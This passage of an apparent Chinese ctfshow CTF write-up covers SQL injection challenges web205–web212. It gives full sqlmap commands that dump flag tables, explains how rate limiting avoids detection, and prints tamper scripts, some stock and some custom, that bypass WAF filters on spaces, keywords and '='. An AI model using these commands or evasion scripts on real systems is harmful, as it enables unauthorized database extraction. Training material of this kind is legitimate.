<li><strong>安全性</strong>：通过指定一个安全 URL，用户可以确保在测试期间，sqlmap 不会对敏感或关键的生产环境数据进行操作。</li>
<li><strong>蜜罐检测</strong>：如果 sqlmap 发现某个请求被认为是危险的，它会将该请求重定向到用户指定的安全 URL，而不是执行原来的操作。这有助于减少对目标系统的风险。</li>
<li><strong>调试和验证</strong>：在进行渗透测试时，使用安全 URL 可以帮助测试人员验证他们的请求是否正常工作，而不会对目标系统造成影响。</li>
</ol>
<p><code>--safe-freq=SAFE</code> 是 sqlmap 中的一个参数，用于设置安全请求的频率限制。这个参数主要用于控制 sqlmap 在执行 SQL 注入测试时发送请求的速率</p>
<p>主要功能</p>
<ol>
<li><strong>频率控制</strong>：通过设置请求的频率，用户可以控制 sqlmap 每秒发送的请求数量。这有助于在进行渗透测试时，减少对目标服务的压力。</li>
<li><strong>规避检测</strong>：调低请求频率可以帮助测试者更好地规避目标网站的安全检测机制，降低被识别为攻击行为的风险。</li>
<li><strong>保护目标</strong>：对目标系统友好的测试可以减少对系统性能的影响，特别是在生产环境中进行渗透测试时，确保不会干扰正常用户的使用。</li>
</ol>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://4d06d46a-4e6e-43ab-8bd6-94e5b084dc4e.challenge.ctf.show/api/index.php --user-agent sqlmap --referer ctf.show --method=&quot;put&quot; --data=&quot;id=1&quot; --headers=&quot;content-type:text/plain&quot; --cookie=&quot;PHPSESSID=000al1ev682ccon2rn8sqvrr5o;&quot; --safe-url=&quot;http://4d06d46a-4e6e-43ab-8bd6-94e5b084dc4e.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump</span><br></pre></td></tr></table></figure>

<h3 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h3><p>#注入payload闭合</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113142940609-1747825292263-35.png" alt="image-20250113142940609"></p>
<p>这里看到sql语句发生了变化，出现了括号，不过sqlmap能自动进行闭合操作</p>
<p>那payload 是不变的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u https://16e2dbc5-b097-4a75-b4ed-def916f5ee74.challenge.ctf.show/api/index.php --user-agent sqlmap --referer ctf.show --method=&quot;put&quot; --data=&quot;id=1&quot; --headers=&quot;content-type:text/plain&quot; --cookie=&quot;PHPSESSID=000al1ev682ccon2rn8sqvrr5o;&quot; --safe-url=&quot;http://16e2dbc5-b097-4a75-b4ed-def916f5ee74.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump</span><br></pre></td></tr></table></figure>

<p>需要设置参数的话可以设置参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">--prefix=PREFIX     注入payload字符串前缀</span><br><span class="line">--suffix=SUFFIX     注入payload字符串后缀</span><br></pre></td></tr></table></figure>

<h3 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h3><p>#space2comment.py绕过空格</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113210335223-1747825292263-37.png" alt="image-20250113210335223"></p>
<p>tamper的话就是sqlmap自带的绕过脚本，在sqlmap目录下的tamper文件夹中</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113210907918-1747825292263-39.png" alt="image-20250113210907918"></p>
<p>可以使用<code>--identify-waf</code>对一些网站是否有安全防护进行试探，那我们返回来看题目，题目中是过滤了空格的，那我们看看那个脚本可以绕过空格绕过</p>
<p>space2comment.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;/**/&quot;</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;/**/&quot;</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>该脚本的主要作用是将 SQL 查询中的空格替换为 SQL 注释</p>
<p>这里可以看到会用&#x2F;**&#x2F;去替代我们的空格</p>
<p>那我们就用这个去打就能绕过空格了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://f45fe3ae-198d-4337-8a19-45f71cf671b2.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --user-agent sqlmap --referer ctf.show --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=kn1ntutpaei8875ksr0vfqk0i1;&quot; --headers=&quot;Content-Type:text/plain&quot; --safe-url=http://f45fe3ae-198d-4337-8a19-45f71cf671b2.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=space2comment.py</span><br></pre></td></tr></table></figure>

<p>常用的tamper脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">base64encode.py：对 payload 进行 Base64 编码。可以帮助绕过某些过滤器。</span><br><span class="line"></span><br><span class="line">randomcase.py：将 SQL 注入 payload 中的字母随机大小写混合，有助于绕过一些简单的大小写敏感过滤。</span><br><span class="line"></span><br><span class="line">space2comment.py：将空格替换为 SQL 注释符号（如 /**/），可用于绕过某些基于空格的过滤。</span><br><span class="line"></span><br><span class="line">between.py：将 = 替换为 BETWEEN，在某些情况下可以绕过过滤。</span><br><span class="line"></span><br><span class="line">time2sleep.py：使用 SLEEP 函数替代时间延迟的方式。这可以在时间盲注中有效。</span><br><span class="line"></span><br><span class="line">unionalltoupdate.py：将 UNION ALL 替换为 UPDATE，有时可以避开某些检测。</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py：用于与 ModSecurity 一起工作，向请求中添加特定的版本信息。</span><br><span class="line"></span><br><span class="line">concat.py：将 SQL 查询中的字符串拼接符 || 转换为 + 或 .，以适应不同数据库的语法。</span><br><span class="line"></span><br><span class="line">char2hex.py：将字符转换为十六进制表示形式，有助于绕过某些字符过滤。</span><br></pre></td></tr></table></figure>

<h3 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h3><p>#randomcase.py绕过关键字</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113212509411-1747825292263-41.png" alt="image-20250113212509411"></p>
<p>这里对select和空格都进行了过滤，那就还得用别的脚本了，这里我们用randomcase.py</p>
<p>randomcase.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import re</span><br><span class="line">from lib.core.common import randomRange</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.data import kb</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">        * SQLite 3</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;InSeRt&#x27;</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;f()&#x27;)</span><br><span class="line">    &#x27;f()&#x27;</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;function()&#x27;)</span><br><span class="line">    &#x27;FuNcTiOn()&#x27;</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM `user`&#x27;)</span><br><span class="line">    &#x27;SeLeCt id FrOm `user`&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;\b[A-Za-z_]&#123;2,&#125;\b&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line">            if (word.upper() in kb.keywords and re.search(r&quot;(?i)[`\&quot;&#x27;\[]%s[`\&quot;&#x27;\]]&quot; % word, retVal) is None) or (&quot;%s(&quot; % word) in payload:</span><br><span class="line">                while True:</span><br><span class="line">                    _ = &quot;&quot;</span><br><span class="line">                    for i in xrange(len(word)):</span><br><span class="line">                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()</span><br><span class="line">                    if len(_) &gt; 1 and _ not in (_.lower(), _.upper()):</span><br><span class="line">                        break</span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>该脚本的作用是将 SQL 注入 payload 中的字母随机大小写混合，有助于绕过一些简单的大小写敏感过滤。</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://de1a8bb8-85b2-42dc-89f8-8e2290303ac7.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --user-agent sqlmap --referer ctf.show --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=h4dcnkdl0hd2on1l3p6gnhlefb;&quot; --headers=&quot;Content-Type:text/plain&quot; --safe-url=https://de1a8bb8-85b2-42dc-89f8-8e2290303ac7.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=space2comment.py,randomcase.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure>

<h3 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h3><p>#绕过&#x2F;*&#x2F;空格&#x2F;&#x3D;&#x2F;的tamper</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113213632537-1747825292263-43.png" alt="image-20250113213632537"></p>
<p>好像过滤更多字符了，*号也被过滤了，那我们的space2comment.py脚本用不了了，但是我们可以自己写个tamper脚本，把原先的space2comment.py里面的替换字符串换成可以绕过空格验证的，然后再加上绕过&#x3D;等于号的条件就可以了</p>
<p>修改后的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += chr(0x0a)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;=&#x27;:</span><br><span class="line">                retVal += chr(0x0a)+&#x27;like&#x27;+chr(0x0a)</span><br><span class="line">                continue</span><br><span class="line">            </span><br><span class="line">            elif payload[i] == &#x27;*&#x27;:</span><br><span class="line">                retVal += chr(0x0a)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += chr(0x0a)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://fa365078-0c4d-4ca2-afcf-54f5e757760c.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --user-agent sqlmap --referer ctf.show --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=kn1ntutpaei8875ksr0vfqk0i1;&quot; --headers=&quot;Content-Type:text/plain&quot; --safe-url=http://fa365078-0c4d-4ca2-afcf-54f5e757760c.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=tamper/web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure>

<h3 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h3><p>#反转+base64编码的tamper</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117220657078-1747825292263-45.png" alt="image-20250117220657078"></p>
<p>照着waf去写tamper就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">import base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal=retVal.encode()</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">    return retVal.decode()</span><br></pre></td></tr></table></figure>

<p>那我们的payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://057ed506-470f-4399-877a-5a8c3b55f2ab.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --user-agent sqlmap --referer ctf.show --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=eioqv5apahcu216l07msg1bmvo;&quot; --headers=&quot;Content-Type:text/plain&quot; --safe-url=http://057ed506-470f-4399-877a-5a8c3b55f2ab.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web210.py --batch -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump</span><br></pre></td></tr></table></figure>

<h3 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h3><p>#反转+base64编码+绕过空格</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117222430990-1747825292263-47.png" alt="image-20250117222430990"></p>
<p>没啥难度，要啥就写啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://9bb4866c-81b4-470f-a589-7d96100eef9c.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --user-agent sqlmap --referer ctf.show --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=0kfnfjjphjp8ut8lnqv0scscq6;&quot; --headers=&quot;Content-Type:text/plain&quot; --safe-url=http://9bb4866c-81b4-470f-a589-7d96100eef9c.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web211.py</span><br></pre></td></tr></table></figure>

<p>tamper</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">import base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;/**/&quot;</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;/**/&quot;</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    if payload:</span><br><span class="line">        retVal=retVal.encode()</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">    return retVal.decode()</span><br></pre></td></tr></table></figure>

<h3 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h3><p>#211plus版tamper</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117223724691-1747825292263-49.png" alt="image-20250117223724691"></p>
<p>就是前几个脚本waf的集合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 